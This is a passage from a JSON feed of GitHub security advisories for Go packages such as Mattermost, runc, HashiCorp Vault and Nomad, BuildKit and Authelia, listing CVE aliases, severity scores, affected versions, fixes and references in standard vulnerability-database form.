"GHSA-8jhh-3jf2-pfwr", "modified": "2023-04-07T21:23:36Z", "published": "2023-03-31T12:30:16Z", "aliases": ["CVE-2023-1775"], "summary": "Mattermost vulnerable to information disclosure ", "details": "When running in a High Availability configuration, Mattermost fails to sanitize some of the `user_updated` and` post_deleted` events broadcast to all users, leading to disclosure of sensitive information to some of the users with currently connected Websocket clients.\n\n[Issue Identifier](https://mattermost.com/security-updates/): MMSA-2023-00138", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.3.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 4.10.10"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.7.0"}, {"fixed": "7.7.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.7.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.1.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.1.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.0.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 5.39.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.0.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 6.7.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1775"}, {"type": "PACKAGE", "url": "https://github.com.mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-07T21:23:36Z", "nvd_published_at": "2023-03-31T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vpvm-3wq2-2wvm", "modified": "2023-03-29T14:46:15Z", "published": "2023-03-03T21:30:19Z", "aliases": ["CVE-2023-27561"], "summary": "Opencontainers runc Incorrect Authorization vulnerability", "details": "runc 1.0.0-rc95 through 1.1.4 has Incorrect Access Control leading to Escalation of Privileges, related to `libcontainer/rootfs_linux.go`. To exploit this, an attacker must be able to spawn two containers with custom volume-mount configurations, and be able to run custom images. NOTE: this issue exists because of a CVE-2019-19921 regression.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0-rc95"}, {"fixed": "1.1.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27561"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/issues/2197#issuecomment-1437617334"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/issues/3751"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/3785"}, {"type": "WEB", "url": "https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/runc"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/releases/tag/v1.1.5"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ANUGDBJ7NBUMSUFZUSKU3ZMQYZ2Z3STN/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DHGVGGMKGZSJ7YO67TGGPFEHBYMS63VF/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FNB2UEDIIJCRQW4WJLZOPQJZXCVSXMLD/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYVE3GB4OG3BNT5DLQHYO4M5SXX33AQ5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/I6BF24VCZRFTYBTT3T7HDZUOTKOTNPLZ/"}], "database_specific": {"cwe_ids": ["CWE-706"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-03T22:43:16Z", "nvd_published_at": "2023-03-03T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-79hx-g43v-xfmr", "modified": "2023-03-23T19:01:37Z", "published": "2023-03-21T06:30:16Z", "aliases": ["CVE-2023-1543"], "summary": "Answer vulnerable to Insufficient Session Expiration", "details": "Insufficient Session Expiration in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1543"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/cd742b75605c99776f32d271c0a60e0f468e181c"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/f82388d6-dfc3-4fbc-bea6-eb40cf5b2683"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:31:39Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6c32-3x46-m9rh", "modified": "2023-03-13T15:35:03Z", "published": "2023-03-07T09:30:29Z", "aliases": ["CVE-2023-1245"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1245"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/71a4cdac81112975969129d308899edd155c0e80"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/f8011bb3-8212-4937-aa58-79f4b73be004"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T00:28:25Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vq59-5x26-h639", "modified": "2023-03-17T14:43:12Z", "published": "2023-03-17T14:43:12Z", "aliases": ["CVE-2023-28109"], "summary": "Authorization Bypass Through User-Controlled Key play-with-docker", "details": "Impact\nGive that CORS configuration was not correct, an attacker could use [play-with-docker.com](http://play-with-docker.com/) as an example, set origin header in http request as  [evil-play-with-docker.com](http://evil-play-with-docker.com/), it will be echo in response header, which successfully bypass the CORS policy and retrieves basic user information.\n\nPatches\nIt has been fixed in lastest version, Please upgrade to latest version\n\nWorkarounds\nNo, users have to upgrade version.\n\n\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/play-with-docker/play-with-docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.0.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/play-with-docker/play-with-docker/security/advisories/GHSA-vq59-5x26-h639"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28109"}, {"type": "WEB", "url": "https://github.com/play-with-docker/play-with-docker/commit/ed82247c9ab7990ad76ec2bf1498c2b2830b6f1a"}, {"type": "PACKAGE", "url": "https://github.com/play-with-docker/play-with-docker"}], "database_specific": {"cwe_ids": ["CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-17T14:43:12Z", "nvd_published_at": "2023-03-16T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3wq5-3f56-v5xc", "modified": "2023-04-07T21:02:25Z", "published": "2023-03-31T12:30:16Z", "aliases": ["CVE-2023-1777"], "summary": "Mattermost vulnerable to information disclosure", "details": "Mattermost allows an attacker to request a preview of an existing message when creating a new message via the createPost API call, disclosing the contents of the linked message.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.3.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 6.7.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.8.0"}, {"fixed": "7.8.1"}]}], "versions": ["7.8.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.7.0"}, {"fixed": "7.7.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.7.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.1.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.1.5"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1777"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}, {"type": "PACKAGE", "url": "github.com/mattermost/mattermost-server"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-07T21:02:25Z", "nvd_published_at": "2023-03-31T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r95w-7cpx-h5mx", "modified": "2023-03-24T17:12:43Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1542"], "summary": "Answer vulnerable to Business Logic Errors", "details": "Business Logic Errors in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1542"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/4ca2429d190a6e614f5bbee1173c80a7cffcc568"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/d947417c-5a12-407a-9a2f-fa696f65126f"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:31:47Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hwj7-frgj-7829", "modified": "2023-03-23T16:30:20Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1537"], "summary": "Answer vulnerable to Authentication Bypass by Capture-replay", "details": "Authentication Bypass by Capture-replay in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1537"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/813ad0b9894673b1bdd489a2e9ab60a44fe990af"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/171cde18-a447-446c-a9ab-297953ad9b86"}], "database_specific": {"cwe_ids": ["CWE-294"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:10Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8jh8-33f5-cgfp", "modified": "2023-03-13T15:33:02Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1243"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1243"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/9870ed87fb24ed468aaf1e169c2d028e0f375106"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/1d62d35a-b096-4b76-a021-347c3f1c570c"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:03:00Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-36f2-fcrx-fp4j", "modified": "2023-03-16T16:04:56Z", "published": "2023-03-16T16:04:56Z", "aliases": ["CVE-2021-29456"], "summary": "Authelia allows open redirects on the logout endpoint", "details": "### Impact\nUtilizing a HTTP query parameter an attacker is able to redirect users from the web application to any domain. The URL of the intended redirect should always be checked for safety prior to forwarding the user. Other endpoints of the web application already do this, they check both that the domain is using the HTTPS protocol and that it exists on a domain associated with the application.\n\nAn attacker is able to use this unintended functionality to redirect users to malicious sites. This particular security issue allows the attacker to make a phishing attempt seem much more trustworthy to a user of the web application as the initial site before redirection is familiar to them, as well as the actual URL which they have theoretically visited frequently. \n\nWhile this security issue does not directly impact the security of the web application, it is still not an acceptable scenario for the reasons mentioned above. \n\n### Patches\nf0cb75e1e102f95f91e9254c66c797e821857690 fix(handlers): logout redirection validation (#1908) [v4.28.0](https://github.com/authelia/authelia/releases/tag/v4.28.0)\n\n### Workarounds\nUsing a reverse proxy to strip the query parameter from the affected endpoint. \n\n### References\nhttps://github.com/authelia/authelia/pull/1908\n\n[CWE-601](https://cwe.mitre.org/data/definitions/601.html)\n\n[Authelia v4.28.0](https://github.com/authelia/authelia/tree/v4.28.0)\n\n### For more information\nIf you have any questions or comments about this advisory, please [contact us](https://github.com/authelia/authelia#contact-options). You may also contact us to request creating a back-ported fix for this if you are able to explain why you cannot upgrade; however upgrading is highly preferable. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/authelia/authelia/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.28.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/authelia/authelia/security/advisories/GHSA-36f2-fcrx-fp4j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29456"}, {"type": "PACKAGE", "url": "https://github.com/authelia/authelia"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-16T16:04:56Z", "nvd_published_at": "2021-04-21T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gc89-7gcr-jxqc", "modified": "2023-03-07T20:09:44Z", "published": "2023-03-07T20:09:44Z", "aliases": ["CVE-2023-26054"], "summary": "Buildkit credentials inlined to Git URLs could end up in provenance attestation", "details": "When the user sends a build request that contains a Git URL that contains credentials and the build creates a provenance attestation describing that build, these credentials could be visible from the provenance attestation.\n\nGit URL can be passed in two ways:\n\n1) Invoking build directly from a URL with credentials.\n\n```\nbuildctl build --frontend dockerfile.v0 --context https://<credentials>@url/repo.git\n```\n\nEquivalent in `docker buildx` would be\n\n```\ndocker buildx build https://<credentials>@url/repo.git\n```\n\n2) If the client sends additional VCS info hint parameters on builds from a local source. Usually, that would mean reading the origin URL from `.git/config` file. \n\nThanks to Oscar Alberto Tovar for discovering the issue.\n\n### Impact\nWhen a build is performed under specific conditions where credentials were passed to BuildKit they may be visible to everyone who has access to provenance attestation.\n\nProvenance attestations and VCS info hints were added in version v0.11.0. Previous versions are not vulnerable.\n\nIn v0.10, when building directly from Git URL, the same URL could be visible in `BuildInfo` structure that is a predecessor of Provenance attestations. Previous versions are not vulnerable.\n\nNote: [Docker Build-push Github action](https://github.com/docker/build-push-action) builds from Git URLs by default but **is not** affected by this issue even when working with private repositories because the credentials are passed [with build secrets](https://github.com/docker/build-push-action/blob/v4.0.0/src/context.ts#L203) and not with URLs.\n\n### Patches\nBug is fixed in v0.11.4 . \n\n### Workarounds\nIt is recommended to pass credentials with build secrets when building directly from Git URL as a more secure alternative than modifying the URL.\n\nIn Docker Buildx, VCS info hint can be disabled by setting `BUILDX_GIT_INFO=0`. `buildctl` does not set VCS hints based on `.git` directory, and values would need to be passed manually with `--opt`.\n\n\n### References\n- Inline credentials in URLs deprecated in RFC3986 https://www.rfc-editor.org/rfc/rfc3986#section-3.2.1\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moby/buildkit"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.10.0"}, {"fixed": "0.11.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moby/buildkit/security/advisories/GHSA-gc89-7gcr-jxqc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26054"}, {"type": "WEB", "url": "https://github.com/moby/buildkit/commit/75123c696506bdbca1ed69906479e200f1b62604"}, {"type": "PACKAGE", "url": "https://github.com/moby/buildkit"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI/"}, {"type": "WEB", "url": "https://www.rfc-editor.org/rfc/rfc3986#section-3.2.1"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-07T20:09:44Z", "nvd_published_at": "2023-03-06T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rqm8-q8j9-662f", "modified": "2023-03-17T16:59:18Z", "published": "2023-03-14T15:30:17Z", "aliases": ["CVE-2023-1299"], "summary": "Nomad Job Submitter Privilege Escalation Using Workload Identity", "details": "### Summary\nA vulnerability was identified in Nomad and Nomad Enterprise (\u201cNomad\u201d) such that a user with the submit-job ACL capability can submit a job that can escalate to management-level privileges. This vulnerability, CVE-2023-1299, was introduced in Nomad 1.5.0 and fixed in Nomad 1.5.1.\n\n### Background\nNomad 1.4.0 introduced the concept of workload identity so that tasks can access variables without needing to access them through Nomad HTTP API with an ACL token.\n\nIn 1.5.0, the identity block was introduced, which exposes the workload identity token to the workload so it can access Nomad HTTP API via a unix domain socket without configuring mTLS.\n\n### Details\nDuring internal testing, we discovered it was possible to abuse the workload identity to elevate to management-level privilege if the workload identity did not have any attached ACL policies.\n\n### Remediation\nCustomers should evaluate the risk associated with this issue and consider upgrading to Nomad 1.5.1 or newer. See Nomad\u2019s Upgrading for general guidance on this process.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.1"}]}], "versions": ["1.5.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1299"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-08-nomad-job-submitter-privilege-escalation-using-workload-identity/51389"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-14T18:02:16Z", "nvd_published_at": "2023-03-14T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vq4h-9ghm-qmrr", "modified": "2023-04-07T19:23:01Z", "published": "2023-03-30T03:30:38Z", "aliases": ["CVE-2023-25000"], "summary": "HashiCorp Vault's implementation of Shamir's secret sharing vulnerable to cache-timing attacks", "details": "HashiCorp Vault's implementation of Shamir's secret sharing used precomputed table lookups, and was vulnerable to cache-timing attacks. An attacker with access to, and the ability to observe a large number of unseal operations on the host through a side channel may reduce the search space of a brute force effort to recover the Shamir shares. Fixed in Vault 1.13.1, 1.12.5, and 1.11.9.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25000"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/pull/19495"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-10-vault-vulnerable-to-cache-timing-attacks-during-seal-and-unseal-operations/52078"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230526-0008/"}], "database_specific": {"cwe_ids": ["CWE-203", "CWE-208"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-07T19:23:01Z", "nvd_published_at": "2023-03-30T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hwc3-3qh6-r4gg", "modified": "2023-04-07T19:22:54Z", "published": "2023-03-30T03:30:38Z", "aliases": ["CVE-2023-0665"], "summary": "HashiCorp Vault's PKI mount vulnerable to denial of service", "details": "HashiCorp Vault's PKI mount issuer endpoints did not correctly authorize access to remove an issuer or modify issuer metadata, potentially resulting in denial of service of the PKI mount. This bug did not affect public or private key material, trust chains or certificate issuance. Fixed in Vault 1.13.1, 1.12.5, and 1.11.9.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0665"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-11-vault-s-pki-issuer-endpoint-did-not-correctly-authorize-access-to-issuer-metadata/52079/1"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230526-0008/"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-07T19:22:54Z", "nvd_published_at": "2023-03-30T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v829-x6hh-cqfq", "modified": "2023-03-10T23:47:53Z", "published": "2023-03-10T23:47:53Z", "aliases": ["CVE-2023-27484"], "summary": "Crossplane-runtime contains Improper Input Validation via Compositions", "details": "### Summary\n\nFuzz testing, by Ada Logics and sponsored by the CNCF, identified a [vulnerability](https://github.com/crossplane/crossplane-runtime/security/advisories/GHSA-vfvj-3m3g-m532) in the `fieldpath` package from `crossplane/crossplane-runtime` that an already highly privileged Crossplane user able to create or update Compositions could leverage to cause an out of memory panic in Crossplane.\n\n### Details\n\nCompositions allow users to specify patches inserting elements into arrays at an arbitrary index. When a Composition is selected for a Composite Resource, patches are evaluated and if a specified index is greater than the current size of the target slice, that slice's size will be increased to the specified index, which could lead to an excessive amount of memory usage and therefore the Pod being OOM-Killed. The index is already capped to the maximum value for a uint32 (4294967295) when parsed, but that is still an unnecessarily large value.\n\n### Workaround\n\nUsers can restrict write privileges on Compositions to only admin users as a workaround.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crossplane/crossplane/security/advisories/GHSA-v829-x6hh-cqfq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27484"}, {"type": "PACKAGE", "url": "https://github.com/crossplane/crossplane"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-10T23:47:53Z", "nvd_published_at": "2023-03-09T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m8cg-xc2p-r3fc", "modified": "2023-03-30T20:17:24Z", "published": "2023-03-30T20:17:24Z", "aliases": ["CVE-2023-25809"], "summary": "rootless: `/sys/fs/cgroup` is writable when cgroupns isn't unshared in runc", "details": "### Impact\nIt was found that rootless runc makes `/sys/fs/cgroup` writable in following conditons:\n1. when runc is executed inside the user namespace, and the `config.json` does not specify the cgroup namespace to be unshared (e.g.., `(docker|podman|nerdctl) run --cgroupns=host`, with Rootless Docker/Podman/nerdctl)\n2. or, when runc is executed outside the user namespace, and `/sys` is mounted with `rbind, ro` (e.g., `runc spec --rootless`; this condition is very rare)\n\nA container may gain the write access to user-owned cgroup hierarchy `/sys/fs/cgroup/user.slice/...` on the host .\nOther users's cgroup hierarchies are not affected.\n\n### Patches\nv1.1.5 (planned)\n\n### Workarounds\n- Condition 1: Unshare the cgroup namespace (`(docker|podman|nerdctl) run --cgroupns=private)`. This is the default behavior of Docker/Podman/nerdctl on cgroup v2 hosts.\n- Condition 2 (very rare): add `/sys/fs/cgroup` to `maskedPaths`\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-m8cg-xc2p-r3fc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25809"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/0d62b950e60f6980b54fe3bafd9a9c608dc1df17"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/runc"}], "database_specific": {"cwe_ids": 